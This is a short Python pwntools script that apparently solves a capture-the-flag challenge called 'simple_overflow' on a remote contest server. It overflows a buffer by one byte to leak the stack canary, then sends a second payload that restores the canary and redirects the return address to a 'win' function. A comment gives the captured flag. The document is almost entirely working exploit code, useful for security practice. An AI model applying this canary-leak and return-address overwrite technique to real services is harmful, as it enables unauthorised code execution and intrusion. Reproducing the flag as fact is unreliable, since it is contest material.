#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./simple_overflow')
# p = process(elf.path)
p = remote("103.162.14.116", 12004)

p.sendlineafter(b'Give me your name: \n', b'daudau')
p.sendlineafter(b'save?\n', b'2')

pay = b'x' * (7 * 8 + 1)
p.sendafter(b'Data: \n', pay)
p.recvuntil(pay)
canary = u64(p.recv(7).rjust(8, b'\x00'))
print(hex(canary))

pay2 = b'x' * (7 * 8) + p64(canary) + p64(0) + p64(0x00000000004014a0) + p64(elf.symbols["win"])
p.sendafter(b'Data: \n', pay2)

p.interactive()
# KCSC{Y0u_g0T_1h3_Sup3R_s3Cr31_F14g}